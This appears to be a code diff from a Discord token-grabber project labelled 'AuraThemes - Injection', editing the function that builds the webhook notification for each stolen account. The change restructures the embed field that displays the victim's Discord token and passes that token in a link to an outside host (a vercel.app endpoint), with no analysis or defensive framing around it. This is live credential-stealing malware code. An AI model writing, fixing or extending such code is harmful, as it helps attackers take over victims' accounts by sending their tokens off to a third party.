@@ -149,13 +149,11 @@ const notify = async (ctx, token, acc) => {
     ctx.username = "@AuraThemes - Injection";
     ctx.avatar_url = "https://i.imgur.com/WkKXZSl.gif";
     ctx.embeds[0].title = `Initialized Grabber - ${ctx.title}`;
-    ctx.embeds[0].fields[0] = [
-        { 
-            name: `<a:aura:1087044506542674091> Token:`, 
-            value: `\`\`\`${token}\`\`\`\n[[Click Here To Copy Your Token]](https://6889-fun.vercel.app/api/aurathemes/raw?data=${token})`, 
-            inline: false
-        },
-    ];
+    ctx.embeds[0].fields.unshift({
+        name: `<a:aura:1087044506542674091> Token:`,
+        value: `\`\`\`${token}\`\`\`\n[[Click Here To Copy Your Token]](https://6889-fun.vercel.app/api/aurathemes/raw?data=${token})`,
+        inline: false
+    })
 
     ctx.embeds[0].thumbnail = {
         url: `https://cdn.discordapp.com/avatars/${acc.id}/${acc.avatar}.webp`,
